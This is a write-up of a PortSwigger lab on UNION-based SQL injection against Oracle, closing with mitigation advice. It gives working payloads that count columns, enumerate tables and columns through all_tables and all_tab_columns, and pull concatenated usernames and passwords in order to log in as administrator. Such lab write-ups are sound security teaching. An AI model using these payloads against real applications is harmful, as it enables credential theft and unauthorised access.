# SQL Injection – Listing Database Contents on Oracle

## 🧪 Lab

PortSwigger Web Security Academy – SQL Injection

**Lab:** SQL injection attack, listing the database contents on Oracle

**Category:** SQL Injection

**Difficulty:** Practitioner

---

## 🎯 Objective

The application contains a SQL injection vulnerability in the product category filter.

The objective was to:

1. Identify the number of columns returned by the original query.
2. Determine which column is reflected in the application response.
3. Enumerate the database tables.
4. Identify the table containing usernames and passwords.
5. Determine the names of the username and password columns.
6. Retrieve the credentials.
7. Log in as the `administrator` user.

---

## 🔎 1. Identifying the Number of Columns

The first step was to determine the number of columns returned by the original SQL query.

`ORDER BY` was used incrementally to identify when the query generated an error.

Example:

```text
Pets' ORDER BY 1-- -
```

```text
Pets' ORDER BY 2-- -
```

```text
Pets' ORDER BY 3-- -
```

The response indicated that the query contained **two columns**.

Therefore, the UNION attack needed to contain two expressions.

---

## 🧪 2. Identifying the Reflected Column

The next step was to determine which column was reflected in the application's response.

Because the database was Oracle, the `dual` table was used.

Payload:

```text
Pets' UNION SELECT 'test',NULL FROM dual-- -
```

The value `test` appeared in the application response.

This confirmed that:

- The UNION attack was working.
- The query contained two columns.
- The first column was reflected in the response.

---

## 🗂️ 3. Enumerating Database Tables

The next step was to identify the tables accessible through the database.

Oracle provides the `all_tables` view, which can be queried to enumerate available tables.

Payload:

```text
Pets' UNION SELECT table_name,NULL FROM all_tables-- -
```

Among the returned table names, the following table was identified:

```text
USERS_CWVQDV
```

The table appeared to contain the application's user credentials.

---

## 🧱 4. Enumerating the Columns

The next step was to determine the columns contained within `USERS_CWVQDV`.

Oracle's `all_tab_columns` view was used.

Payload:

```text
Pets' UNION SELECT column_name,NULL FROM all_tab_columns WHERE table_name='USERS_CWVQDV'-- -
```

The following columns were identified:

```text
USERNAME_NRGGCD
PASSWORD_PAXLMS
```

The relevant table structure was therefore:

| Column | Purpose |
|---|---|
| `USERNAME_NRGGCD` | Username |
| `PASSWORD_PAXLMS` | Password |

---

## 🔐 5. Retrieving Usernames

The username column was queried using the UNION injection:

```text
Pets' UNION SELECT USERNAME_NRGGCD,NULL FROM USERS_CWVQDV-- -
```

This returned the usernames stored in the table, including the `administrator` account.

---

## 🔑 6. Retrieving Passwords

The password column was then queried:

```text
Pets' UNION SELECT PASSWORD_PAXLMS,NULL FROM USERS_CWVQDV-- -
```

This returned the passwords stored in the table.

---

## 🧩 7. Retrieving Username and Password Together

Oracle supports string concatenation using the `||` operator.

Therefore, both values could be retrieved through the reflected column using:

```text
Pets' UNION SELECT USERNAME_NRGGCD||':'||PASSWORD_PAXLMS,NULL FROM USERS_CWVQDV-- -
```

The response returned the credentials in the following format:

```text
username:password
```

This allowed the administrator credentials to be identified.

> Credentials obtained during the lab are intentionally not documented here.

---

## 🏁 8. Authentication

The retrieved `administrator` credentials were used to authenticate against the application's login function.

The authentication was successful and the PortSwigger lab was completed.

---

## 🧠 Key Takeaways

This lab demonstrated a complete UNION-based SQL injection attack against an Oracle database.

The main techniques used were:

- Identifying the number of columns using `ORDER BY`.
- Identifying the reflected column using `UNION SELECT`.
- Using Oracle's `dual` table.
- Enumerating tables through `all_tables`.
- Enumerating columns through `all_tab_columns`.
- Identifying an application-specific users table.
- Extracting usernames and passwords.
- Concatenating database fields using `||`.
- Using the retrieved credentials to authenticate as an administrator.

---

## 🛡️ Mitigation

The vulnerability can be prevented by avoiding the construction of SQL queries using untrusted user input.

Recommended protections include:

- Use parameterized queries / prepared statements.
- Never concatenate user-controlled input directly into SQL statements.
- Apply appropriate input validation.
- Use database accounts with the minimum privileges required.
- Avoid exposing detailed database errors to users.
- Perform regular security testing of application input points.

---

## 📚 References

- PortSwigger Web Security Academy – SQL Injection
- Oracle Database documentation – `ALL_TABLES`
- Oracle Database documentation – `ALL_TAB_COLUMNS`
